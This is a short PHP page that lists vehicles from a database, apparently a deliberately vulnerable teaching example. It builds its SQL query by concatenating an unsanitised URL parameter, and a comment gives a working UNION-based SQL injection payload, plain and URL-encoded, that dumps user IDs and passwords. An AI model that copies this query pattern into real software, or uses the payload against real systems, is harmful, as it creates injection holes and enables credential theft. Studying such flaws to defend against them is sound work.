<html>
    <head>
        <title>
            Vehicle List
        </title>
    </head>
    <body>
        <h1>All Vehicles</h1>
        <table>
            <tr>
                <th>Reg No.</th>
                <th>Category</th>
                <th>Brand</th>
            </tr>
            <?php include "connectdb.php"?>
        <?php
            //Test url - this obtains a list of all users and their passwords stored in the database
            //the query is just URL encoded and actually says this - test' Union Select UserId as reg_no, password as brand, '' as category, '' as description, ''as dailyrate from users#
            //http://localhost/listvehicles.php?vehicleReg=test%27%20Union%20Select%20UserId%20as%20reg_no,%20password%20as%20brand,%20%27%27%20as%20category,%20%27%27%20as%20description,%20%27%27as%20dailyrate%20from%20users%23
             $number1 = $_GET["vehicleReg"];

             $query = "SELECT * from vehicles WHERE reg_no = '".$number1."'";
             print $query;
             
                $rows = $db->query($query);

                foreach($rows as $row)
                {
                    echo("<tr><td>".$row['reg_no']."</td><td>".$row["category"]."</td><td>".$row["brand"]."</td></tr>");
                }
        ?>
    </table>
    </body>

</html>